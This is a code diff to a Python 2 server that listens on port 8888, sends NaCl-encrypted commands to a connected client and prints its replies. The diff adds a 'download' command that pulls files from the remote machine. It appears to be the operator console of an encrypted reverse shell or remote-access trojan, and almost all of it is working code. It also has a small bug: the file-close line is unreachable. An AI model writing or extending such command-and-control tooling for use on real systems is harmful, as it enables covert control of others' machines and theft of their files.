@@ -3,6 +3,7 @@ import socket,os
 import sys
 import nacl.secret
 import nacl.utils
+import time,os
 
 HOST = '0.0.0.0'   # Symbolic name, meaning all available interfaces
 PORT = 8888 # Arbitrary non-privileged port
@@ -47,6 +48,31 @@ while 1:
             nextcmdEnc = box.encrypt(nextcmd)
             #send dat sh!t
             conn.send(nextcmdEnc)
+
+            #download file
+            if nextcmd.startswith("download") == True:
+                fileName = nextcmd[9:]
+
+                f = open(fileName, 'wb')
+                print 'Download in progress... ' + fileName
+
+                #start downloading the damn file
+                while True:
+                        r = conn.recv(1024)
+                        while(r):
+                                if r.endswith("EOFEOFEOFEOFEOFX"):
+                                    u = r[:-16]
+                                    f.write(u)
+                                    break
+                                else:
+                                    f.write(r)
+                                    r = conn.recv(1024)
+                        break
+                        #close the file
+                        f.close()
+
+
+
     # else, just print
     else:
     	   print datadec
